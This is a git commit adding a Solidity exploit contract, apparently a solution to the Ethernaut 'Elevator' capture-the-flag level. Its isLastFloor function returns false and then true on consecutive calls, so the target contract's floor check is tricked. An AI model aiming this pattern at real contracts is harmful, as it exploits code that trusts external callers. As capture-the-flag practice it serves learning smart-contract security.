0fb8373c5fb5edb817986716d96f857732c41cac
Nicolas Montalbano <nicolasignacio.montalbano@gmail.com>
2022-11-22 20:52:58 -0300

    Level 11 - Elevator

---
+++ Level 11 - Elevator/ElevatorHack.sol
@@ -0,0 +1,31 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Elevator{
+    function goTo(uint _floor) external;
+}
+
+contract ElevatorHack {
+
+    uint public contador = 0;
+    Elevator public targetContract;
+
+    constructor(address _targetContract){
+        targetContract = Elevator(_targetContract);
+    }
+
+    function isLastFloor(uint _floor) external returns (bool){
+        if(contador == 0){
+            contador++;
+            return false;
+        }
+        else{
+            contador++;
+            return true;
+        }
+    }
+
+    function Attack() public{
+        targetContract.goTo(10);
+    }
+}
